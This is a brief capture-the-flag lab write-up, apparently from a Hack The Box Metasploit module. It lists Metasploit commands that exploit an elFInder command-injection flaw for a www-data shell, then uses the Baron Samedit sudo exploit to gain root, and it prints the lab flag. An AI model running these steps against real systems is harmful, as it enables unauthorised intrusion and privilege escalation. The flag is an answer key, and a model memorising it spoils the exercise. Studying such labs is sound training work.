# Sessions & Jobs

### The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

elFInder

### Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

```bash
msfcosnole
search elFInder
use exploit/linux/http/elfinder_archive_cmd_injection
set rhosts
set lhost
set lport
run
getuid
www-data
```

### The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

```bash
background
search sudo
use exploit/linux/local/sudo_baron_samedit
set rhosts
set lhost
set lport
set session
run
getuid # root
cat /root/flag.txt
HTB{5e55ion5_4r3_sw33t}
```
